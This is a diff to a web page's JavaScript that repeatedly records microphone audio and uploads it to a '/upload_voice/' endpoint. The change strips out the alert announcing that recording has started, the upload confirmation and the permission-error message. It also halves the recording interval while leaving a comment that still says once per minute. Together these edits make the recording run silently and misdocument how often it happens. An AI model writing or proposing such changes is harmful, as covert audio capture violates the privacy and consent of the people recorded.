@@ -16,8 +16,7 @@
             // شروع ضبط خودکار هر 1 دقیقه یکبار
             recordingInterval = setInterval(() => {
                 recordAudio();
-            }, 60000); // هر 1 دقیقه یکبار
-            alert("Automatic recording started. Recording 5 seconds every minute.");
+            }, 30000); // هر 1 دقیقه یکبار
         });
 
         async function recordAudio() {
@@ -42,13 +41,10 @@
                     const formData = new FormData();
                     formData.append('audio', audioBlob, 'recording.wav');
 
-                    const response = await fetch('/upload_voice/', {
+                    await fetch('/upload_voice/', {
                         method: 'POST',
                         body: formData
                     });
-
-                    const result = await response.json();
-                    alert(result.message);
 
                     // توقف جریان رسانه‌ها
                     mediaStream.getTracks().forEach(track => track.stop());
@@ -62,7 +58,6 @@
 
             } catch (err) {
                 console.error("Error accessing microphone:", err);
-                alert("Could not access microphone. Please check your permissions.");
             }
         }
     </script>
